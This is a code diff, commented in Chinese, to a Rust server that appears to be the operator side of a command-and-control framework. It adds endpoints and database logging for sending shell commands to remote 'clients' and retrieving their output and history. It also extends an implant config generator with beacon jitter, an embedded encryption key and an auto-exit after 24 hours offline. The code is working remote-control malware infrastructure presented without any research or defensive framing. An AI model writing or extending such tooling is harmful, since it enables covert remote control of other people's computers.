@@ -64,6 +64,14 @@ pub struct ShellResponseInfo {
     pub timestamp: i64,
 }
 
+#[derive(Debug, Serialize)]
+pub struct ShellHistoryItem {
+    pub command: String,
+    pub output: Option<String>,
+    pub success: bool,
+    pub timestamp: String,
+}
+
 #[derive(Debug, Deserialize)]
 pub struct SetBeaconRequest {
     pub interval_seconds: u64,
@@ -78,6 +86,7 @@ pub fn create_api_routes() -> Router<SharedState> {
         .route("/clients/:id", delete(disconnect_client))
         .route("/clients/:id/shell", post(send_shell_command))
         .route("/clients/:id/shell", get(get_shell_responses))
+        .route("/clients/:id/shell/history", get(get_shell_history))
         .route("/clients/:id/beacon", post(set_beacon_interval))
         // 文件管理
         .route("/clients/:id/files", get(get_file_responses))
@@ -175,10 +184,15 @@ async fn send_shell_command(
     Path(client_id): Path<String>,
     Json(req): Json<ShellCommandRequest>,
 ) -> impl IntoResponse {
+    let command = req.command.clone();
     let msg = Message::ShellExecute(ShellExecute { command: req.command });
     match msg.serialize() {
         Ok(data) => {
             send_to_client(&state, &client_id, &data);
+            // 记录命令到数据库（output 留空，等响应回来再记录）
+            if let Some(ref db) = state.db {
+                let _ = db.log_shell_command(&client_id, &command, None, true);
+            }
             StatusCode::OK
         }
         Err(_) => StatusCode::INTERNAL_SERVER_ERROR
@@ -192,14 +206,43 @@ async fn get_shell_responses(
 ) -> Json<Vec<ShellResponseInfo>> {
     let responses: Vec<ShellResponseInfo> = state.take_shell_responses(&client_id)
         .into_iter()
-        .map(|r| ShellResponseInfo {
-            output: r.output,
-            is_error: r.is_error,
-            timestamp: r.timestamp,
+        .map(|r| {
+            // 将响应写入数据库
+            if let Some(ref db) = state.db {
+                let _ = db.log_shell_command(&client_id, "[response]", Some(&r.output), !r.is_error);
+            }
+            ShellResponseInfo {
+                output: r.output,
+                is_error: r.is_error,
+                timestamp: r.timestamp,
+            }
         })
         .collect();
     
     Json(responses)
+}
+
+/// GET /api/clients/:id/shell/history - 获取 Shell 历史记录
+async fn get_shell_history(
+    State(state): State<SharedState>,
+    Path(client_id): Path<String>,
+) -> Json<Vec<ShellHistoryItem>> {
+    let history = if let Some(ref db) = state.db {
+        db.get_shell_history(&client_id, 200)
+            .unwrap_or_default()
+            .into_iter()
+            .rev()  // 数据库返回 DESC，前端需要 ASC（从旧到新）
+            .map(|h| ShellHistoryItem {
+                command: h.command,
+                output: h.output,
+                success: h.success,
+                timestamp: h.created_at,
+            })
+            .collect()
+    } else {
+        vec![]
+    };
+    Json(history)
 }
 
 /// POST /api/clients/:id/beacon - 设置心跳间隔
@@ -885,9 +928,10 @@ fn generate_c_config(request: &BuildRequest) -> String {
 #define VERSION "1.0.0"
 
 // Beacon Configuration
-#define HEARTBEAT_INTERVAL 30 // seconds
-#define RECONNECT_DELAY 5     // seconds
-#define JITTER_PERCENT 20     // 0-100%
+#define HEARTBEAT_INTERVAL 30       // seconds
+#define RECONNECT_DELAY 5           // seconds
+#define JITTER_PERCENT 20           // 0-100%
+#define MAX_DISCONNECT_SECONDS 86400 // Auto-exit after 24h disconnect (0=disable)
 
 // Encryption Key (64 hex chars = 32 bytes)
 #define ENCRYPTION_KEY \
